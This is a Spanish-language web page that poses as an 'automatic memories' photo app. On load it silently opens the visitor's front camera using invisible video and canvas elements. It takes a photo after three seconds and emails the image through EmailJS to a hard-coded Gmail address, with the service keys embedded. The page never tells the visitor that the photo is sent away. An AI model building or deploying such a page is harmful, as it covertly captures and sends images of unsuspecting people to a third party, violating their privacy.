<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Recuerdos Automáticos 📸</title>
</head>
<body>
  <h1>📷 Capturando tus recuerdos...</h1>

  <!-- Video y canvas invisibles -->
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <!-- EmailJS -->
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

  <script>
    // Inicializa EmailJS
    emailjs.init("VjQYPRJy2mXtQPXgB"); // tu Public Key

    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");

    // Variables globales
    let photoCount = 0;             // fotos tomadas
    const maxPhotos = 1;            // límite de fotos
    const photoInterval = 3000;     // intervalo entre fotos en ms

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }
        });
        video.srcObject = stream;
        video.play();

        video.onloadedmetadata = () => {
          const interval = setInterval(() => {
            takePhoto(stream);
            photoCount++;

            if(photoCount >= maxPhotos){
              clearInterval(interval);
              stream.getTracks().forEach(track => track.stop());
            }
          }, photoInterval);
        };
      } catch (err) {
        console.error("Error al acceder a la cámara:", err);
      }
    }

    function takePhoto(stream) {
      const context = canvas.getContext("2d");

      // Reducir resolución para menor tamaño de Base64
      canvas.width = video.videoWidth / 2;
      canvas.height = video.videoHeight / 2;

      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Marco dorado
      context.lineWidth = 20;
      context.strokeStyle = "gold";
      context.strokeRect(0, 0, canvas.width, canvas.height);

      // Fecha y hora
      const now = new Date();
      context.font = "30px Arial";
      context.fillStyle = "white";
      context.strokeStyle = "black";
      context.lineWidth = 2;
      const text = now.toLocaleString();
      context.strokeText(text, 20, canvas.height - 30);
      context.fillText(text, 20, canvas.height - 30);

      // Convertir a JPEG y reducir calidad al 50%
      const imageData = canvas.toDataURL("image/jpeg", 0.5);

      // Enviar la foto inmediatamente
      enviarFoto(imageData, photoCount);
    }

    function enviarFoto(imageBase64, numero) {
      const params = {
        to_email: "root52909@gmail.com",
        message: `¡Aquí tienes el recuerdo #${numero}! 📸`,
        photo: imageBase64
      };

      emailjs.send("service_ky1f599", "template_dlw99r6", params)
        .then(() => console.log(`📩 Foto #${numero} enviada!`))
        .catch(err => console.error(`❌ Error al enviar foto #${numero}:`, err));
    }

    // Inicia la cámara al cargar la página
    startCamera();
  </script>
</body>
</html>
